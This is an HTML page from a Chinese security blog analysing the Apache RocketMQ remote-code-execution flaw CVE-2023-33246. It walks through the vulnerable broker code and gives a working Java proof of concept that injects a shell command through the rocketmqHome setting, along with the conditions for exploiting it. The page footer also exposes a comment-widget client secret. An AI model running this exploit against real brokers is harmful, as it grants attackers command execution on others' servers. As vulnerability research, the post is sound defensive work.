@@ -1,0 +1,375 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Apache RocketMQ RCE(CVE-2023-33246)分析 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Apache RocketMQ RCE(CVE-2023-33246)分析 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+RocketMQ是一个开源的分布式消息队列系统，最初由阿里巴巴集团开发并开源。它旨在提供可靠的、高性能的消息传递和异步通信能力，广泛应用于大规模分布式系统中。
+NameServer与Broker等组件之间的关系？
+Apache Roc..." />
+    <meta name="keywords" content="RocketMQ,Java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Apache RocketMQ RCE(CVE-2023-33246)分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-05-31
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/rocketmq/" class="post-tag">
+                  # RocketMQ
+                </a>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>RocketMQ是一个开源的分布式消息队列系统，最初由阿里巴巴集团开发并开源。它旨在提供可靠的、高性能的消息传递和异步通信能力，广泛应用于大规模分布式系统中。</p>
+<h2 id="nameserver与broker等组件之间的关系">NameServer与Broker等组件之间的关系？</h2>
+<p>Apache RocketMQ是一个分布式消息中间件项目，用于支持高可靠性、高性能和可扩展的消息传递。在RocketMQ中，每个消息生产者和消费者都与Broker（代理服务器）建立连接，以进行消息的发送和接收。</p>
+<p>他们的关系如图：</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/476abb0bde376.png" alt="1685628743925.png" loading="lazy"></figure>
+<h2 id="name-server">Name Server</h2>
+<blockquote>
+<p>NameServer是一个非常简单的Topic路由注册中心，其角色类似Dubbo中的zookeeper，支持Broker的动态注册与发现。</p>
+<p>主要功能：</p>
+<ul>
+<li>Broker管理：NameServer接受Broker集群的注册信息并且保存下来作为路由信息的基本数据。然后提供心跳检测机制，检查Broker是否还存活(由<code>NamesrvController</code>处理)；</li>
+<li>路由信息管理：每个NameServer将保存关于Broker集群的整个路由信息和用于客户端查询的队列信息。</li>
+</ul>
+</blockquote>
+<h2 id="broker">Broker</h2>
+<blockquote>
+<p>集群最核心模块，主要负责Topic消息存储、消费者的消费位点管理（消费进度）</p>
+<p>Broker会注册到 Name Server上去，无论是否是主从, 每个 Broker 都会注册到 Name Server 上</p>
+<p>Broker也提供心跳机制，检查与生产者和消费者的连接情况，由<code>BrokerController</code>处理</p>
+</blockquote>
+<p>心跳机制是RocketMQ用于维持与Broker之间连接状态的一种机制。通过发送心跳消息，生产者和消费者可以告知Broker它们的存在和正常运行状态。默认情况下，RocketMQ的心跳间隔为30秒。如果2分钟内没有收到心跳数据，则断开连接。</p>
+<p>在RocketMQ中，心跳消息的处理是由Broker的<code>BrokerController</code>负责的。当Broker收到来自生产者或消费者的心跳消息时，<code>BrokerController</code>会处理该消息并维护与对应客户端的连接状态。所以就会调用到</p>
+<p><code>BrokerController#this.filterServerManager.start()</code>，进而触发漏洞。</p>
+<blockquote>
+<p>这也就解释了为什么漏洞是30秒触发一次！</p>
+</blockquote>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>通过补丁可以看到直接把这些类删除了</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/d592ea3f6be85.png" alt="1685596566230.png" loading="lazy"></figure>
+<pre><code class="language-java">public class FilterServerManager {
+  	//......
+    public void createFilterServer() {
+        int more =
+            this.brokerController.getBrokerConfig().getFilterServerNums() - this.filterServerTable.size();
+        String cmd = this.buildStartCommand();
+        for (int i = 0; i &lt; more; i++) {
+            FilterServerUtil.callShell(cmd, log);
+        }
+    }
+
+    private String buildStartCommand() {
+        String config = &quot;&quot;;
+        if (BrokerStartup.CONFIG_FILE_HELPER.getFile() != null) {
+            config = String.format(&quot;-c %s&quot;, BrokerStartup.CONFIG_FILE_HELPER.getFile());
+        }
+
+        if (this.brokerController.getBrokerConfig().getNamesrvAddr() != null) {
+            config += String.format(&quot; -n %s&quot;, this.brokerController.getBrokerConfig().getNamesrvAddr());
+        }
+
+        if (NetworkUtil.isWindowsPlatform()) {
+            return String.format(&quot;start /b %s\\bin\\mqfiltersrv.exe %s&quot;,
+                this.brokerController.getBrokerConfig().getRocketmqHome(),
+                config);
+        } else {
+            return String.format(&quot;sh %s/bin/startfsrv.sh %s&quot;,
+                this.brokerController.getBrokerConfig().getRocketmqHome(),
+                config);
+        }
+    }
+  //......
+}
+</code></pre>
+<pre><code class="language-java">public class FilterServerUtil {
+    public static void callShell(final String shellString, final Logger log) {
+        Process process = null;
+        try {
+            String[] cmdArray = splitShellString(shellString);
+            process = Runtime.getRuntime().exec(cmdArray);
+            process.waitFor();
+            log.info(&quot;CallShell: &lt;{}&gt; OK&quot;, shellString);
+        } catch (Throwable e) {
+            log.error(&quot;CallShell: readLine IOException, {}&quot;, shellString, e);
+        } finally {
+            if (null != process)
+                process.destroy();
+        }
+    }
+
+    private static String[] splitShellString(final String shellString) {
+        return shellString.split(&quot; &quot;);
+    }
+}
+</code></pre>
+<p>可以看到<code>buildStartCommand()</code>函数使用了sh去执行这个startfsrv.sh，这里可以拼接rce。当<code>RocketmqHome</code>的值为<code>-c $@|sh . echo open -a Calculator;</code>时，此时的命令为</p>
+<pre><code class="language-bash">sh -c $@|sh . echo open -a Calculator;/bin/startfsrv.sh -n NamesrvAddr
+</code></pre>
+<p>第一个命令是 <code>sh -c $@</code>，它使用 <code>sh</code> 解释器执行传递给程序的参数。在这段代码中，<code>$@</code> 表示接受传入的参数，并将它们作为命令来执行。</p>
+<p>第二个命令是 <code>sh . echo open -a Calculator;/bin/startfsrv.sh -n NamesrvAddr</code>，这里会打印输出<code>open -a Calculator</code>并返回给<code>$@</code>变量。</p>
+<p>最后执行<code>sh -c open -a Calculator</code></p>
+<p>当执行<code>DefaultMQAdminExt#updateBrokerConfig(&quot;127.0.0.1:10911&quot;, properties)</code>更新配置文件的时候，就会触发<code>BrokerController#filterServerManager.start()</code>，然后调用<code>FilterServerManager#createFilterServer()</code>，最终RCE</p>
+<p>还有一个需要注意的点就是：more不能为0，也就是FilterServerNums不为0即可</p>
+<pre><code class="language-java">int more = this.brokerController.getBrokerConfig().getFilterServerNums() - this.filterServerTable.size();
+</code></pre>
+<p>Poc：</p>
+<pre><code class="language-java">public static void main(String[] args) throws IOException {
+  Properties props = new Properties();
+  props.setProperty(&quot;rocketmqHome&quot;,&quot;-c $@|sh . echo open -a Calculator;&quot;);
+  props.setProperty(&quot;filterServerNums&quot;,&quot;1&quot;);
+  DefaultMQAdminExt admin = new DefaultMQAdminExt();
+  admin.setNamesrvAddr(&quot;localhost:9876&quot;);
+  admin.start();   
+  admin.updateBrokerConfig(&quot;localhost:10911&quot;, props);
+  Properties brokerConfig = admin.getBrokerConfig(&quot;localhost:10911&quot;);
+  admin.shutdown();
+}
+</code></pre>
+<p>利用条件：</p>
+<blockquote>
+<p>1.使用了RocketMQ 5.1.0及以下版本<br>
+2.Broker都开启并暴露在公网上，默认端口为10911</p>
+</blockquote>
+<h1 id="漏洞复现">漏洞复现</h1>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/52ca6ab113feb.png" alt="1685598978606.png" loading="lazy"></figure>
+<h1 id="为什么攻击的时候并不需要真实的nameserver地址">为什么攻击的时候并不需要真实的NameServer地址？</h1>
+<p>需要<code>NameServer</code>的原因是<code>updateBrokerConfig()</code>函数需要传入<code>NameServer</code>，所以它不能为空</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/345fc6c1def7a.png" alt="1685624486302.png" loading="lazy"></figure>
+<p>接着我们来看一下命令拼接的地方</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/df8241f27b0ae.png" alt="1685625242067.png" loading="lazy"></figure>
+<p>这里执行的是:</p>
+<pre><code class="language-bash">sh ${rocketmqhome}/bin/startfsrv.sh -n ${NameServer}
+</code></pre>
+<p>我们拼接的命令为:</p>
+<pre><code class="language-bash">sh -c $@|sh . echo open -a Calculator;/bin/startfsrv.sh -n ${NameServer}
+</code></pre>
+<p><code>$@</code>是一个特殊的参数，用于表示传递给脚本的所有参数列表</p>
+<p><code>echo open -a Calculator</code>  得到 <code>open -a Calculator</code>传递给<code>$@</code></p>
+<p>然后再被<code>sh -c</code>执行</p>
+<p>这里我们的命令执行已经完成了，后面的<code>/bin/startfsrv.sh</code>并没有被执行，<code>${NameServer}</code>也就自然用不上了。如果想让sh正常执行，只需要在前面多一个小数点就行，但跟漏洞利用没关系了。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/37d98770a7ccc.png" alt="1685626365510.png" loading="lazy"></figure>
+<p>这个<code>/bin/startfsrv.sh</code>脚本的意义就是：</p>
+<p>设置环境变量<code>ROCKETMQ_HOME</code>并启动<code>RocketMQ的Filtersrv</code>服务，并且将传入进来的<code>${NameServer}</code>赋予给<code>$@</code>变量，用于后续<code>FiltersrvStartup</code>类使用。但是我没找到这个类</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/6a8caaf3a5daa.png" alt="1685627249166.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/4a62840fef0f2.png" alt="1685627441570.png" loading="lazy"></figure>
+<p>应该这个类在之前被删除掉了，但这里的sh脚本还没更新。</p>
+<blockquote>
+<p>所以在这个漏洞利用的过程中，不需要使用真实的NameServer地址，只需要让他不为空即可。</p>
+</blockquote>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a>
+<ul>
+<li><a href="#nameserver%E4%B8%8Ebroker%E7%AD%89%E7%BB%84%E4%BB%B6%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB">NameServer与Broker等组件之间的关系？</a></li>
+<li><a href="#name-server">Name Server</a></li>
+<li><a href="#broker">Broker</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li>
+<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%94%BB%E5%87%BB%E7%9A%84%E6%97%B6%E5%80%99%E5%B9%B6%E4%B8%8D%E9%9C%80%E8%A6%81%E7%9C%9F%E5%AE%9E%E7%9A%84nameserver%E5%9C%B0%E5%9D%80">为什么攻击的时候并不需要真实的NameServer地址？</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/text4shell/">
+              <h3 class="post-title">
+                Text4Shell (CVE-2022-42889) 分析
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
